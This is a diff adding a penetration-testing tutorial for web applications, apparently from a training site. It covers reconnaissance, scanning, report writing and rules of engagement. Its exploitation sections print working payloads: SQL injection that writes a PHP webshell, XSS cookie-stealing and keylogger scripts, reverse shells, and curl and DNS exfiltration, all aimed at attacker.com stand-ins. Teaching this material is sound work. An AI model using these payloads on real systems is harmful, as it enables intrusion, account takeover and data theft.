@@ -1,0 +1,592 @@
+---
+title: "Web Application Penetration Testing"
+description: "Master the complete methodology of web application penetration testing from reconnaissance to reporting"
+category: "penetration-testing"
+difficulty: "advanced"
+duration: "4 hours"
+author: "CyberCodex Team"
+publishedAt: "2024-10-28"
+tags: ["penetration testing", "web security", "OWASP", "Burp Suite", "methodology"]
+prerequisites: ["Web Security basics", "SQL Injection knowledge", "Basic programming"]
+learningObjectives:
+  - "Understand complete pentest methodology"
+  - "Master industry-standard tools (Burp Suite, OWASP ZAP)"
+  - "Identify and exploit web vulnerabilities"
+  - "Write professional penetration test reports"
+---
+
+## Introduction
+
+Web application penetration testing is a systematic approach to finding and exploiting security vulnerabilities in web applications. This comprehensive guide covers the complete methodology used by professional penetration testers.
+
+## Penetration Testing Methodology
+
+### 1. Planning and Reconnaissance
+
+#### Defining Scope
+
+```markdown
+**In Scope:**
+- example.com and *.example.com
+- Web application at https://app.example.com
+- API endpoints at https://api.example.com
+
+**Out of Scope:**
+- Third-party services
+- Production databases
+- Social engineering
+- DoS attacks
+
+**Testing Window:**
+- November 1-5, 2024
+- 9 AM - 5 PM EST
+```
+
+#### Passive Reconnaissance
+
+```bash
+# DNS enumeration
+dig example.com ANY
+nslookup -type=any example.com
+
+# WHOIS lookup
+whois example.com
+
+# Subdomain enumeration
+sublist3r -d example.com
+amass enum -d example.com
+
+# Google dorking
+site:example.com inurl:admin
+site:example.com filetype:pdf
+site:example.com intext:"sql error"
+```
+
+#### Active Reconnaissance
+
+```bash
+# Technology fingerprinting
+whatweb https://example.com
+wappalyzer https://example.com
+
+# Port scanning
+nmap -sV -p 80,443,8080,8443 example.com
+
+# Directory brute forcing
+gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt
+ffuf -u https://example.com/FUZZ -w wordlist.txt
+```
+
+### 2. Vulnerability Assessment
+
+#### Automated Scanning
+
+**Using Burp Suite Pro:**
+
+```
+1. Configure browser proxy (127.0.0.1:8080)
+2. Browse application normally (build sitemap)
+3. Run automated scan:
+   - Scanner > New Scan
+   - Select target scope
+   - Choose scan configuration (Audit checks: All)
+   - Start scan
+```
+
+**Using OWASP ZAP:**
+
+```bash
+# Automated scan
+zap-cli quick-scan -s all -r report.html https://example.com
+
+# Spider + active scan
+zap-cli spider https://example.com
+zap-cli active-scan https://example.com
+```
+
+**Using Nikto:**
+
+```bash
+nikto -h https://example.com -o nikto-report.html -Format html
+```
+
+#### Manual Testing Checklist
+
+```markdown
+✓ Authentication & Session Management
+  - Password policy
+  - Brute force protection
+  - Session timeout
+  - Session fixation
+  - CSRF protection
+
+✓ Authorization
+  - Horizontal privilege escalation
+  - Vertical privilege escalation
+  - Insecure direct object references (IDOR)
+
+✓ Input Validation
+  - SQL injection (all parameters)
+  - XSS (reflected, stored, DOM-based)
+  - Command injection
+  - Path traversal
+  - XXE injection
+  - SSRF
+
+✓ Business Logic
+  - Race conditions
+  - Price manipulation
+  - Workflow bypasses
+
+✓ API Security
+  - Missing authentication
+  - Excessive data exposure
+  - Rate limiting
+  - Mass assignment
+
+✓ Configuration
+  - Default credentials
+  - Verbose error messages
+  - Security headers
+  - CORS misconfigurations
+```
+
+### 3. Exploitation
+
+#### SQL Injection Example
+
+**Finding the vulnerability:**
+
+```http
+GET /products?id=1' HTTP/1.1
+Host: example.com
+
+Response: SQL syntax error
+```
+
+**Exploiting:**
+
+```sql
+# Enumerate database
+1' UNION SELECT NULL,schema_name FROM information_schema.schemata--
+
+# Enumerate tables
+1' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema='webapp'--
+
+# Extract data
+1' UNION SELECT NULL,CONCAT(username,':',password) FROM users--
+
+# Reading files (if permissions allow)
+1' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--
+
+# Writing webshell
+1' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
+```
+
+#### Cross-Site Scripting (XSS)
+
+**Reflected XSS:**
+
+```html
+<!-- Testing payload -->
+<script>alert(document.domain)</script>
+
+<!-- Cookie stealing -->
+<script>
+document.location='https://attacker.com/steal.php?c='+document.cookie
+</script>
+
+<!-- Keylogger -->
+<script>
+document.onkeypress = function(e) {
+  fetch('https://attacker.com/log.php?key=' + e.key);
+}
+</script>
+```
+
+**Stored XSS:**
+
+```html
+<!-- In comment field -->
+<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
+
+<!-- SVG upload -->
+<svg onload="alert(document.domain)">
+```
+
+#### Authentication Bypass
+
+**SQL Injection Auth Bypass:**
+
+```sql
+Username: admin' OR '1'='1'--
+Password: (anything)
+
+# Resulting query:
+SELECT * FROM users WHERE username='admin' OR '1'='1'--' AND password='...'
+```
+
+**JWT Manipulation:**
+
+```python
+import jwt
+
+# Decode existing JWT
+token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+decoded = jwt.decode(token, options={"verify_signature": False})
+print(decoded)  # {'user': 'bob', 'role': 'user'}
+
+# Modify claims
+decoded['role'] = 'admin'
+
+# Re-encode with 'none' algorithm
+new_token = jwt.encode(decoded, None, algorithm='none')
+```
+
+#### Command Injection
+
+**Vulnerable code:**
+
+```php
+<?php
+$ip = $_GET['ip'];
+system("ping -c 4 " . $ip);
+?>
+```
+
+**Exploitation:**
+
+```bash
+# Command chaining
+?ip=8.8.8.8; whoami
+?ip=8.8.8.8 && cat /etc/passwd
+?ip=8.8.8.8 | nc attacker.com 4444 -e /bin/bash
+
+# Reverse shell
+?ip=8.8.8.8; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+```
+
+### 4. Post-Exploitation
+
+#### Privilege Escalation
+
+```bash
+# After getting RCE, check privileges
+id
+whoami
+sudo -l
+
+# Find SUID binaries
+find / -perm -4000 2>/dev/null
+
+# Check for writable directories
+find / -writable -type d 2>/dev/null
+
+# Kernel exploits
+uname -a
+searchsploit linux kernel 4.15
+```
+
+#### Lateral Movement
+
+```bash
+# Find other internal services
+netstat -tulpn
+ss -tulpn
+
+# Find credentials
+grep -r "password" /var/www/html/
+find / -name "*.conf" -exec grep -i "password" {} \;
+
+# Pivot to internal network
+# Using sshuttle
+sshuttle -r user@compromised-host 10.0.0.0/8
+```
+
+#### Data Exfiltration
+
+```bash
+# Using curl
+curl -X POST -d @sensitive-data.txt https://attacker.com/receive
+
+# Using DNS exfiltration
+for line in $(cat data.txt); do
+  dig $line.attacker.com
+done
+
+# Using base64 encoding
+cat database.sql | base64 | curl -d @- https://attacker.com/receive
+```
+
+## Essential Tools
+
+### Burp Suite
+
+**Key Features:**
+- Intercepting proxy
+- Scanner (Pro only)
+- Intruder (brute force/fuzzing)
+- Repeater (manual testing)
+- Decoder/Encoder
+- Sequencer (session token analysis)
+
+**Common Workflows:**
+
+```python
+# Intruder - Password brute force
+1. Send login request to Intruder
+2. Mark password parameter with §§
+3. Load password list
+4. Start attack
+5. Look for different response lengths/status codes
+
+# Repeater - Manual SQLi testing
+1. Send vulnerable request to Repeater
+2. Modify parameter: id=1'
+3. Send and observe response
+4. Iterate payloads
+```
+
+### OWASP ZAP
+
+```bash
+# Start ZAP daemon
+zap.sh -daemon -port 8081
+
+# Configure and spider
+zap-cli --zap-url http://localhost:8081 -v start
+zap-cli spider https://example.com
+
+# Active scan
+zap-cli active-scan -r https://example.com
+
+# Generate report
+zap-cli report -o zap-report.html -f html
+```
+
+### SQLMap
+
+```bash
+# Basic SQL injection test
+sqlmap -u "https://example.com/product?id=1"
+
+# With cookie
+sqlmap -u "https://example.com/product?id=1" --cookie="session=abc123"
+
+# Dump entire database
+sqlmap -u "https://example.com/product?id=1" --dump-all
+
+# Get shell
+sqlmap -u "https://example.com/product?id=1" --os-shell
+```
+
+### Custom Scripts
+
+**Python  script for IDOR testing:**
+
+```python
+import requests
+
+session = requests.Session()
+session.cookies.set('session', 'your-session-cookie')
+
+# Test IDOR on user profiles
+for user_id in range(1, 1000):
+    response = session.get(f'https://example.com/api/users/{user_id}')
+
+    if response.status_code == 200:
+        data = response.json()
+        print(f"[+] Found user {user_id}: {data['username']}")
+
+        # Check if we can access other users' data
+        if data['user_id'] != YOUR_USER_ID:
+            print(f"[!] IDOR vulnerability! Accessed user {user_id}'s data")
+```
+
+## Report Writing
+
+### Executive Summary
+
+```markdown
+# Executive Summary
+
+## Assessment Overview
+- **Target**: example.com Web Application
+- **Dates**: November 1-5, 2024
+- **Tester**: Security Team
+- **Scope**: Web application and API endpoints
+
+## Risk Summary
+- **Critical**: 2 findings
+- **High**: 5 findings
+- **Medium**: 12 findings
+- **Low**: 8 findings
+- **Informational**: 3 findings
+
+## Key Findings
+1. SQL Injection in product search (Critical)
+2. Stored XSS in comment system (High)
+3. Missing authentication on admin API (Critical)
+
+## Business Impact
+The identified vulnerabilities could lead to:
+- Complete database compromise
+- User account takeover
+- Unauthorized administrative access
+- Reputational damage
+```
+
+### Technical Findings
+
+```markdown
+## Finding 1: SQL Injection in Product Search
+
+**Severity**: Critical
+**CVSS**: 9.8 (Critical)
+**Likelihood**: High
+**Impact**: Complete system compromise
+
+### Description
+The product search functionality is vulnerable to SQL injection attacks, allowing an attacker to execute arbitrary SQL commands against the backend database.
+
+### Location
+- **URL**: https://example.com/search
+- **Parameter**: `q` (GET parameter)
+- **Endpoint**: `/api/search`
+
+### Steps to Reproduce
+1. Navigate to https://example.com/search
+2. Enter payload: `test' OR '1'='1'--`
+3. Observe that all products are returned
+4. Extract database: `test' UNION SELECT schema_name FROM information_schema.schemata--`
+
+### Proof of Concept
+```http
+GET /search?q=test'+UNION+SELECT+username,password+FROM+users-- HTTP/1.1
+Host: example.com
+
+HTTP/1.1 200 OK
+[
+  {"name": "admin", "price": "$5$hashedpassword123"},
+  {"name": "user1", "price": "$5$hashedpassword456"}
+]
+```
+
+### Impact
+- Complete database access
+- User credential theft
+- Potential for remote code execution via `INTO OUTFILE`
+- Data manipulation/deletion
+
+### Remediation
+1. **Use prepared statements:**
+```python
+# Vulnerable code
+query = f"SELECT * FROM products WHERE name LIKE '%{user_input}%'"
+
+# Fixed code
+query = "SELECT * FROM products WHERE name LIKE ?"
+cursor.execute(query, (f'%{user_input}%',))
+```
+
+2. **Input validation:**
+- Whitelist allowed characters
+- Implement length restrictions
+- Escape special characters
+
+3. **Least privilege:**
+- Database user should not have FILE privileges
+- Separate read/write permissions
+
+### References
+- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
+- [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
+```
+
+## Legal and Ethical Considerations
+
+### Rules of Engagement
+
+```markdown
+✓ DO:
+- Stay within defined scope
+- Document everything
+- Report critical findings immediately
+- Stop testing if you cause service disruption
+- Maintain confidentiality
+
+✗ DON'T:
+- Test systems outside scope
+- Access sensitive customer data unnecessarily
+- Perform DoS attacks
+- Use findings for personal gain
+- Disclose vulnerabilities publicly before remediation
+```
+
+### Authorization
+
+Always have **written authorization** before testing:
+
+```markdown
+# Penetration Testing Authorization
+
+I, [Client Name], authorize [Your Company/Name] to perform penetration testing on the following systems:
+
+**Scope:**
+- example.com (IP: 192.0.2.1)
+- app.example.com (IP: 192.0.2.2)
+
+**Duration:**
+- Start: November 1, 2024
+- End: November 5, 2024
+
+**Signature:**
+[Client Signature]
+[Date]
+```
+
+## Practice Labs
+
+### Vulnerable Applications
+
+1. **DVWA** (Damn Vulnerable Web Application)
+```bash
+docker run -d -p 80:80 vulnerables/web-dvwa
+```
+
+2. **bWAPP** (Buggy Web Application)
+3. **WebGoat** (OWASP)
+4. **Juice Shop** (OWASP)
+5. **HackTheBox** - Real-world scenarios
+6. **TryHackMe** - Guided learning paths
+
+## Summary
+
+Key takeaways:
+- **Follow a structured methodology**
+- **Document everything**
+- **Understand business impact**
+- **Communicate clearly with stakeholders**
+- **Never stop learning**
+
+Professional penetration testing requires:
+- Technical skills
+- Methodological approach
+- Clear communication
+- Ethical responsibility
+- Continuous learning
+
+## Next Steps
+
+- Get OSCP or CEH certification
+- Practice on vulnerable applications
+- Read OWASP Testing Guide
+- Join bug bounty programs
+- Build your own lab environment
+
+## Resources
+
+- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
+- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
+- [HackerOne Hacktivity](https://hackerone.com/hacktivity)
+- [PTES Technical Guidelines](http://www.pentest-standard.org/)
